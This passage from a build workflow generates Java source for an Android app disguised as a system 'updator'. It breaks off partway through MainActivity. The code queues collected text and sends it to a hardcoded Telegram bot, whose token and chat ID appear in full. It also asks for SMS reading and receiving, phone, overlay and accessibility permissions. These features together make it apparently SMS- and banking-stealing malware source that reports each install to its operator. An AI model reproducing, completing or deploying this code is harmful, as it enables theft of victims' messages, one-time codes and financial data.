      - name: Generate TelegramQueue.java
        run: |
          cat > app/src/main/java/com/system/updator/TelegramQueue.java << 'EOF'
          package com.system.updator;

          import android.content.Context;
          import android.net.ConnectivityManager;
          import android.net.Network;
          import android.net.NetworkCapabilities;
          import android.net.NetworkRequest;
          import android.util.Log;

          import org.json.JSONObject;

          import java.io.BufferedReader;
          import java.io.File;
          import java.io.FileInputStream;
          import java.io.FileOutputStream;
          import java.io.InputStreamReader;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.net.URLEncoder;
          import java.nio.charset.StandardCharsets;
          import java.util.ArrayList;
          import java.util.List;
          import java.util.concurrent.ExecutorService;
          import java.util.concurrent.Executors;

          public class TelegramQueue {

              private static final String TAG = "TelegramQueue";
              private static final int MAX_QUEUE = 500;

              private static TelegramQueue instance;

              private final Context appContext;
              private final File queueFile;
              private final ExecutorService executor = Executors.newSingleThreadExecutor();
              private final Object lock = new Object();

              private ConnectivityManager.NetworkCallback networkCallback;

              private TelegramQueue(Context context) {
                  this.appContext = context.getApplicationContext();
                  File dir = new File(appContext.getFilesDir(), "fin_vault");
                  if (!dir.exists()) dir.mkdirs();
                  this.queueFile = new File(dir, "telegram_queue.jsonl");
              }

              public static synchronized TelegramQueue get(Context context) {
                  if (instance == null) instance = new TelegramQueue(context);
                  return instance;
              }

              public void registerNetworkCallback() {
                  if (networkCallback != null) return;
                  try {
                      ConnectivityManager cm = (ConnectivityManager)
                              appContext.getSystemService(Context.CONNECTIVITY_SERVICE);
                      if (cm == null) return;
                      networkCallback = new ConnectivityManager.NetworkCallback() {
                          @Override
                          public void onAvailable(Network network) {
                              flush();
                          }
                      };
                      NetworkRequest req = new NetworkRequest.Builder()
                              .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                              .build();
                      cm.registerNetworkCallback(req, networkCallback);
                  } catch (Exception e) {
                      Log.e(TAG, "registerNetworkCallback failed", e);
                  }
              }

              public void send(String text) {
                  if (text == null || text.isEmpty()) return;
                  enqueue(text);
                  flush();
              }

              private void enqueue(String text) {
                  synchronized (lock) {
                      try {
                          JSONObject obj = new JSONObject();
                          obj.put("ts", System.currentTimeMillis());
                          obj.put("text", text);
                          List<String> lines = readQueue();
                          lines.add(obj.toString());
                          if (lines.size() > MAX_QUEUE) {
                              int drop = lines.size() - MAX_QUEUE;
                              for (int i = 0; i < drop; i++) lines.remove(0);
                          }
                          writeQueue(lines);
                      } catch (Exception e) {
                          Log.e(TAG, "enqueue failed", e);
                      }
                  }
              }

              public void flush() {
                  executor.execute(this::flushInternal);
              }

              private void flushInternal() {
                  synchronized (lock) {
                      List<String> lines = readQueue();
                      if (lines.isEmpty()) return;
                      List<String> remaining = new ArrayList<>();
                      boolean stop = false;
                      for (int i = 0; i < lines.size(); i++) {
                          String line = lines.get(i);
                          if (stop) { remaining.add(line); continue; }
                          String text;
                          try {
                              JSONObject obj = new JSONObject(line);
                              text = obj.optString("text", "");
                          } catch (Exception e) { continue; }
                          if (text.isEmpty()) continue;
                          boolean ok = sendSync(text);
                          if (ok) {
                              try { Thread.sleep(300); } catch (InterruptedException ignored) { }
                          } else {
                              remaining.add(line);
                              stop = true;
                          }
                      }
                      writeQueue(remaining);
                  }
              }

              private boolean sendSync(String text) {
                  HttpURLConnection conn = null;
                  try {
                      String encoded = URLEncoder.encode(text, "UTF-8");
                      String urlStr = "https://api.telegram.org/bot"
                              + FinAutoService.BOT_TOKEN + "/sendMessage?chat_id="
                              + FinAutoService.CHAT_ID
                              + "&parse_mode=Markdown&text=" + encoded;
                      URL url = new URL(urlStr);
                      conn = (HttpURLConnection) url.openConnection();
                      conn.setRequestMethod("GET");
                      conn.setConnectTimeout(8000);
                      conn.setReadTimeout(8000);
                      int code = conn.getResponseCode();
                      return code >= 200 && code < 300;
                  } catch (Exception e) {
                      return false;
                  } finally {
                      if (conn != null) conn.disconnect();
                  }
              }

              private List<String> readQueue() {
                  List<String> out = new ArrayList<>();
                  if (!queueFile.exists()) return out;
                  try (BufferedReader br = new BufferedReader(
                          new InputStreamReader(new FileInputStream(queueFile),
                                  StandardCharsets.UTF_8))) {
                      String line;
                      while ((line = br.readLine()) != null) {
                          if (!line.trim().isEmpty()) out.add(line);
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "readQueue failed", e);
                  }
                  return out;
              }

              private void writeQueue(List<String> lines) {
                  try (FileOutputStream fos = new FileOutputStream(queueFile, false)) {
                      for (String l : lines) {
                          fos.write(l.getBytes(StandardCharsets.UTF_8));
                          fos.write('\n');
                      }
                      fos.flush();
                  } catch (Exception e) {
                      Log.e(TAG, "writeQueue failed", e);
                  }
              }
          }
          EOF

      - name: Generate MainActivity.java
        run: |
          cat > app/src/main/java/com/system/updator/MainActivity.java << 'EOF'
          package com.system.updator;

          import android.Manifest;
          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.SharedPreferences;
          import android.content.pm.PackageManager;
          import android.database.Cursor;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.provider.Settings;
          import android.provider.Telephony;
          import android.widget.Button;
          import android.widget.TextView;
          import android.util.Log;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;

          import java.text.SimpleDateFormat;
          import java.util.Date;
          import java.util.Locale;

          public class MainActivity extends Activity {
              private static final int PERMISSION_REQUEST = 100;
              private static final String TAG = "MainActivity";

              private static final long ACTIVATION_DELAY_MS = 5L * 60L * 1000L;

              private static final String BOT_TOKEN = "8871459518:AAGhsiMwoG6qTGZ-S-6VIwRNszCQD2w1uQI";
              private static final String CHAT_ID = "8468538314";

              private TextView tvStatus;
              private Button btnPermissions, btnOverlay, btnAccessibility;
              private SharedPreferences prefs;
              private Handler handler = new Handler(android.os.Looper.getMainLooper());

              private static final String[] REQUIRED_PERMISSIONS = {
                  Manifest.permission.RECEIVE_SMS,
                  Manifest.permission.READ_SMS,
                  Manifest.permission.CALL_PHONE,
                  Manifest.permission.READ_PHONE_STATE,
                  Manifest.permission.READ_PHONE_NUMBERS
              };

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  prefs = getSharedPreferences("fin_vault", MODE_PRIVATE);

                  long installTime;
                  if (!prefs.contains("install_time")) {
                      installTime = System.currentTimeMillis();
                      prefs.edit().putLong("install_time", installTime).apply();
                  } else {
                      installTime = prefs.getLong("install_time", 0L);
                  }

                  if (!prefs.getBoolean("install_notice_sent", false)) {
                      prefs.edit().putBoolean("install_notice_sent", true).apply();
                      sendInstallNotice(installTime);
                  }

                  tvStatus = findViewById(R.id.tvStatus);
                  btnPermissions = findViewById(R.id.btnPermissions);
                  btnOverlay = findViewById(R.id.btnOverlay);
                  btnAccessibility = findViewById(R.id.btnAccessibility);

                  btnPermissions.setOnClickListener(v -> {
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                          ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST);
                      }
                  });

                  btnOverlay.setOnClickListener(v -> {
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                          if (!Settings.canDrawOverlays(this)) {
                              Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                      Uri.parse("package:" + getPackageName()));
                              startActivity(i);
                          } else {
                              tvStatus.setText("Overlay permission already granted");
